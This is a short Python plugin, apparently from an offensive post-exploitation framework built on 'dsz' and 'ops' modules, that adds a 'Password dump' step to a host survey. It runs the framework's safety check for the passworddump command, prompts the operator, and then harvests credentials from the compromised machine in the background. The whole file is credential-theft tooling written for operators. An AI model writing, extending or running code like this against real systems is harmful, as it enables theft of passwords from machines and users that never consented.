
from optparse import OptionParser
import dsz
import ops, ops.survey
import ops.cmd
import ops.project
import datetime
import ops.security

def main():
    parser = OptionParser()
    parser.add_option('--maxage', dest='maxage', default='3600', help='Maximum age of information to use before re-running commands for this module', type='int')
    (options, args) = parser.parse_args()
    ops.survey.print_header('Password dump')
    pwdump_cmd = ops.cmd.getDszCommand('passworddump')
    (issafe, messages) = pwdump_cmd.safetyCheck()
    if (not issafe):
        ops.warn('Skipping passworddump for now because of a failed safety check')
        ops.warn(messages)
        ops.warn("If you want to do it yourself, feel free, but I don't think it's safe")
        ops.pause()
        return
    yesno = dsz.ui.Prompt("I think it's safe to run passworddump.  Do you want to run it?")
    if yesno:
        ops.security.get_passwords(maxage=datetime.timedelta(seconds=options.maxage), cmd_options={'dszbackground': True})
if ((__name__ == '__main__') or (__name__ == ops.survey.PLUGIN)):
    main()